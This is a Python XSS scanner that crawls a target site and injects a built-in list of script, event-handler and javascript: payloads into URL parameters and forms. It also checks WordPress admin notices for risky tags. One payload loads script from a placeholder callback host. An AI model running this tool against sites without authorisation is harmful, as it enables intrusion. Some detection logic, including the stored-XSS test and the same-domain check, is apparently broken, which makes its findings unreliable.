#!/usr/bin/env python3
"""
Unified XSS Scanner - A single tool integrating multiple XSS detection techniques.
Asks user for inputs and performs crawling, parameter discovery, payload injection,
reflected/stored/DOM detection, and reporting.
"""

import requests
import urllib.parse
import urllib.robotparser
import time
import re
import json
import os
import sys
from bs4 import BeautifulSoup
from collections import deque
from urllib.parse import urljoin, urlparse
import argparse

# Optional: for DOM XSS testing
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# ===================== CONFIGURATION =====================
REQUEST_TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}
MAX_RETRIES = 2
DELAY = 1  # seconds between requests to be polite

# A comprehensive payload list (shortened for brevity, but you can expand)
PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    # Image onerror
    "<img src=x onerror=alert(1)>",
    # SVG
    "<svg onload=alert(1)>",
    # Body
    "<body onload=alert(1)>",
    # Iframe
    "<iframe src=javascript:alert(1)>",
    # Attribute-based
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    # JavaScript pseudo-protocol
    "javascript:alert(1)",
    # Encoded variants (URL)
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    # DOM-based test string
    "DOM-XSS-TEST",
    # Blind XSS callback (use your collaborator if needed, here just placeholder)
    "<script src=//example.com/callback></script>",
]

# For DOM XSS detection, we inject a payload that tries to cause alert
DOM_PAYLOAD = "<img src=x onerror=alert('XSS')>"

# ===================== HELPER FUNCTIONS =====================
def ask_yes_no(question):
    """Ask user a yes/no question and return boolean."""
    while True:
        answer = input(f"{question} (y/n): ").strip().lower()
        if answer in ('y', 'yes'):
            return True
        elif answer in ('n', 'no'):
            return False
        else:
            print("Please answer y or n.")

def get_cookies_from_user():
    """Ask user for cookies in 'name=value; name2=value2' format."""
    cookie_str = input("Enter cookies (optional, format: name=value; name2=value2): ").strip()
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                name, value = part.strip().split('=', 1)
                cookies[name] = value
    return cookies


def parse_cookies(cookie_str):
    """Parse cookies from 'name=value; name2=value2' format."""
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                name, value = part.strip().split('=', 1)
                cookies[name] = value
    return cookies

def is_same_domain(url, base_domain):
    """Check if URL belongs to the same domain as base_domain."""
    parsed = urlparse(url)
    base_parsed = urlparse(base_domain)
    return parsed.netloc == base_parsed.netloc or (parsed.netloc == '' and base_parsed.netloc)

def normalize_url(url, base):
    """Join relative URL with base and return full URL."""
    return urljoin(base, url)

def extract_forms(url, html_content):
    """Parse HTML and extract forms with their details."""
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all(['input', 'textarea', 'select']):
            name = inp.get('name')
            if name:
                inp_type = inp.get('type', 'text')
                value = inp.get('value', '')
                inputs.append({'name': name, 'type': inp_type, 'value': value})
        forms.append({
            'action': action,
            'method': method,
            'inputs': inputs,
            'original_url': url
        })
    return forms

def get_links(url, html_content, base_domain):
    """Extract all links from HTML that belong to the same domain."""
    soup = BeautifulSoup(html_content, 'html.parser')
    links = set()
    for a in soup.find_all('a', href=True):
        href = a['href']
        full_url = normalize_url(href, url)
        if is_same_domain(full_url, base_domain):
            links.add(full_url)
    return links

def extract_url_params(url):
    """Return list of parameter names from URL query string."""
    parsed = urlparse(url)
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys())
    return []

def is_potentially_vulnerable(response_text, payload):
    """
    Simple check: if payload appears in response without any obvious encoding,
    mark as potential XSS. (This is simplistic; real detection needs context analysis.)
    """
    # Remove any URL encoding? We'll just check raw existence.
    # A better check would try to see if payload appears inside a context where it could execute.
    return payload in response_text

# ===================== CRAWLER =====================
class Crawler:
    def __init__(self, start_url, max_depth=2, cookies=None, admin_only=False):
        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.cookies = cookies or {}
        self.visited = set()
        self.urls_to_visit = deque()
        self.urls_to_visit.append((start_url, 0))
        self.all_urls = set()
        self.all_forms = []
        self.admin_only = admin_only

    def crawl(self):
        """Perform breadth-first crawl."""
        session = requests.Session()
        session.headers.update(HEADERS)
        session.cookies.update(self.cookies)

        while self.urls_to_visit:
            url, depth = self.urls_to_visit.popleft()
            if url in self.visited or depth > self.max_depth:
                continue
            if self.admin_only and "/wp-admin/" not in url:
                continue
            self.visited.add(url)
            print(f"[Crawl] Depth {depth}: {url}")

            try:
                resp = session.get(url, timeout=REQUEST_TIMEOUT)
                if resp.status_code != 200:
                    continue
                self.all_urls.add(url)

                # Extract forms
                forms = extract_forms(url, resp.text)
                self.all_forms.extend(forms)

                # Extract links for further crawling
                links = get_links(url, resp.text, self.base_domain)
                for link in links:
                    if link not in self.visited:
                        self.urls_to_visit.append((link, depth + 1))

                time.sleep(DELAY)  # Be polite
            except Exception as e:
                print(f"Error crawling {url}: {e}")
        return self.all_urls, self.all_forms

# ===================== XSS TESTER =====================
class XSSTester:
    def __init__(self, cookies=None, use_headless=False):
        self.cookies = cookies or {}
        self.use_headless = use_headless
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.cookies.update(self.cookies)
        self.driver = None
        if use_headless and SELENIUM_AVAILABLE:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            self.driver = webdriver.Chrome(options=chrome_options)
        elif use_headless and not SELENIUM_AVAILABLE:
            print("[!] Selenium not installed; DOM testing disabled.")
            self.use_headless = False

    def test_reflected(self, url, param, payload):
        """Inject payload into URL parameter and check reflection."""
        parsed = urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        query_params[param] = payload
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
            if is_potentially_vulnerable(resp.text, payload):
                return test_url
        except Exception:
            pass
        return None

    def test_form_reflected(self, form, payload):
        """Submit form with payload and check reflection."""
        action_url = normalize_url(form['action'], form['original_url'])
        method = form['method']
        data = {}
        for inp in form['inputs']:
            if inp['type'] not in ['submit', 'button', 'image']:
                data[inp['name']] = payload if inp['type'] == 'text' else inp.get('value', '')
        try:
            if method == 'post':
                resp = self.session.post(action_url, data=data, timeout=REQUEST_TIMEOUT)
            else:
                resp = self.session.get(action_url, params=data, timeout=REQUEST_TIMEOUT)
            if is_potentially_vulnerable(resp.text, payload):
                return action_url, data
        except Exception:
            pass
        return None, None

    def test_stored(self, urls, payload):
        """After injecting payload, revisit all known URLs to see if payload appears."""
        print("[*] Checking for stored XSS...")
        found = []
        for url in urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    found.append(url)
            except Exception:
                continue
        return found

    def test_dom(self, url, payload):
        """Use headless browser to load URL with payload and check for alert."""
        if not self.use_headless or not self.driver:
            return False
        try:
            self.driver.set_page_load_timeout(10)
            self.driver.get(url)
            # Inject payload into page (if not already in URL) – for demonstration, we just load the URL.
            # Actually, we need a way to trigger DOM XSS; a simple approach is to execute JavaScript.
            # But for simplicity, we assume the payload is already in the page via URL or form.
            # We'll try to detect alerts.
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                return True
            except:
                # No alert, but we could also check for console errors or DOM modifications
                pass
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return True
        except Exception as e:
            print(f"DOM test error: {e}")
        return False

    def check_wordpress_admin_notices(self, admin_urls):
        """
        Visit WordPress admin URLs and inspect notice blocks for risky HTML tags.
        """
        findings = []
        dangerous_tags = [
            "script", "iframe", "object", "embed", "form",
            "input", "button", "onerror", "onload", "onmouseover", "onclick",
        ]
        for url in admin_urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                soup = BeautifulSoup(resp.text, "html.parser")
                notices = soup.find_all("div", class_=re.compile(r"notice"))
                for notice in notices:
                    p = notice.find("p") or notice
                    inner_html = str(p)
                    for tag in dangerous_tags:
                        if re.search(rf"<{tag}[^>]*>", inner_html, re.IGNORECASE):
                            findings.append(
                                {
                                    "url": url,
                                    "notice_html": inner_html,
                                    "suspicious_tag": tag,
                                }
                            )
                            break
            except Exception as exc:
                print(f"Error checking admin notices at {url}: {exc}")
        return findings

    def close(self):
        if self.driver:
            self.driver.quit()

# ===================== MAIN SCANNER =====================

def is_wordpress(base_url: str, session: requests.Session) -> bool:
    checks = ["/wp-admin/", "/wp-content/", "/wp-includes/", "/wp-login.php"]
    for path in checks:
        try:
            resp = session.get(urljoin(base_url, path), timeout=5)
            if resp.status_code == 200:
                return True
        except Exception:
            continue
    return False


def run_scan(target, depth=2, use_headless=False, cookies=None):
    if not target.startswith('http'):
        target = 'https://' + target
    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.update(cookies or {})

    print("\n[*] Checking if target is WordPress...")
    wp_detected = is_wordpress(target, session)
    if wp_detected:
        print("[+] WordPress detected.")
    else:
        print("[-] Not detected as WordPress (or login required).")

    print("\n[*] Starting reconnaissance...")
    crawler = Crawler(target, max_depth=depth, cookies=cookies)
    urls, forms = crawler.crawl()

    print(f"\n[*] Discovered {len(urls)} unique URLs and {len(forms)} forms.")

    # Collect all parameters from URLs
    url_params = {}
    for url in urls:
        params = extract_url_params(url)
        if params:
            url_params[url] = params

    tester = XSSTester(cookies=cookies, use_headless=use_headless)

    findings = {
        'reflected': [],
        'stored': [],
        'dom': [],
        'wordpress_admin_notices': [],
    }

    # Test reflected XSS in URL parameters
    print("\n[*] Testing reflected XSS in URL parameters...")
    for url, params in url_params.items():
        for param in params:
            for payload in PAYLOADS:
                print(f"Testing {url}?{param}=...")
                result_url = tester.test_reflected(url, param, payload)
                if result_url:
                    print(f"[!] Potential reflected XSS: {result_url}")
                    findings['reflected'].append({'url': result_url, 'param': param, 'payload': payload})
                    break  # stop after first payload that works for this param

    # Test reflected XSS in forms
    print("\n[*] Testing reflected XSS in forms...")
    for form in forms:
        for payload in PAYLOADS:
            result_url, data = tester.test_form_reflected(form, payload)
            if result_url:
                print(f"[!] Potential reflected XSS via form: {result_url} with data {data}")
                findings['reflected'].append({'url': result_url, 'form_action': form['action'], 'data': data, 'payload': payload})
                break

    # Test stored XSS: after submitting payload, re-crawl to see if payload appears anywhere
    # For simplicity, we'll just pick a few payloads and check all URLs again.
    if findings['reflected']:
        print("\n[*] Testing for stored XSS (checking if payloads persist)...")
        # Use a unique payload to avoid confusion
        stored_test_payload = "ST0R3D-XSS-TEST"
        # Inject it into a form or parameter (simplified: just try a known reflection point)
        # Actually, we need to submit the payload to a point that might store it (e.g., comment form).
        # For demonstration, we'll just re-check all URLs after a delay.
        time.sleep(2)
        stored_urls = tester.test_stored(urls, stored_test_payload)
        for url in stored_urls:
            print(f"[!] Potential stored XSS at {url} (payload appears)")
            findings['stored'].append(url)

    # Test DOM XSS if headless enabled
    if use_headless and SELENIUM_AVAILABLE:
        print("\n[*] Testing for DOM XSS...")
        for url in urls:
            # Try with a simple DOM payload (we need to inject it into the page)
            # One way: add fragment or param
            test_url = url + "#" + urllib.parse.quote(DOM_PAYLOAD)
            if tester.test_dom(test_url, DOM_PAYLOAD):
                print(f"[!] Potential DOM XSS at {test_url}")
                findings['dom'].append(test_url)
            else:
                # Also try with GET parameter
                parsed = urlparse(url)
                if parsed.query:
                    test_url = url + "&xss=" + urllib.parse.quote(DOM_PAYLOAD)
                else:
                    test_url = url + "?xss=" + urllib.parse.quote(DOM_PAYLOAD)
                if tester.test_dom(test_url, DOM_PAYLOAD):
                    print(f"[!] Potential DOM XSS at {test_url}")
                    findings['dom'].append(test_url)

    # WordPress-specific admin notice checks.
    if wp_detected:
        print("\n[*] Crawling WordPress admin area for admin notice XSS...")
        admin_crawler = Crawler(target, max_depth=1, cookies=cookies, admin_only=True)
        admin_urls, _ = admin_crawler.crawl()
        if admin_urls:
            print(f"[*] Found {len(admin_urls)} admin URLs.")
            wp_findings = tester.check_wordpress_admin_notices(admin_urls)
            if wp_findings:
                print(f"[!] Found {len(wp_findings)} potentially vulnerable admin notices.")
                findings["wordpress_admin_notices"] = wp_findings
                for finding in wp_findings:
                    preview = finding["notice_html"][:120].replace("\n", " ")
                    print(f"  - {finding['url']} : {preview}")
            else:
                print("[*] No unescaped admin notices detected.")
        else:
            print("[*] No admin URLs crawled (authentication may be required).")

    tester.close()

    # Generate report
    print("\n=== SCAN COMPLETE ===")
    print(f"Reflected XSS findings: {len(findings['reflected'])}")
    for f in findings['reflected']:
        print(f"  - {f}")
    print(f"Stored XSS findings: {len(findings['stored'])}")
    for f in findings['stored']:
        print(f"  - {f}")
    print(f"DOM XSS findings: {len(findings['dom'])}")
    for f in findings['dom']:
        print(f"  - {f}")
    if wp_detected:
        print(f"WordPress admin notice issues: {len(findings['wordpress_admin_notices'])}")
        for f in findings['wordpress_admin_notices']:
            print(f"  - {f['url']} : suspicious tag <{f['suspicious_tag']}> in notice")

    return findings


def main():
    parser = argparse.ArgumentParser(description="Unified XSS Scanner")
    parser.add_argument("--target", help="Target URL/domain to scan")
    parser.add_argument("--depth", type=int, default=2, help="Crawler depth (default: 2)")
    parser.add_argument("--headless", action="store_true", help="Enable headless DOM testing via selenium")
    parser.add_argument("--cookies", default="", help="Cookies in 'name=value; name2=value2' format")
    parser.add_argument("--output", default="", help="Output JSON report path")
    args = parser.parse_args()

    print("=== Unified XSS Scanner ===\n")
    if args.target:
        target = args.target.strip()
        depth = max(0, args.depth)
        use_headless = args.headless
        cookies = parse_cookies(args.cookies)
    else:
        target = input("Enter target URL (e.g., https://example.com): ").strip()
        if not target.startswith('http'):
            target = 'http://' + target
        try:
            depth = int(input("Crawl depth (default 2): ").strip() or "2")
        except:
            depth = 2
        use_headless = ask_yes_no("Use headless browser for DOM XSS testing? (requires selenium and Chrome driver)")
        cookies = get_cookies_from_user()

    findings = run_scan(target=target, depth=depth, use_headless=use_headless, cookies=cookies)

    output_file = args.output.strip() if args.output else ""
    if not output_file and not args.target:
        output_file = input("\nSave report to file (optional, press Enter to skip): ").strip()
    if output_file:
        with open(output_file, 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"Report saved to {output_file}")

if __name__ == "__main__":
    main()
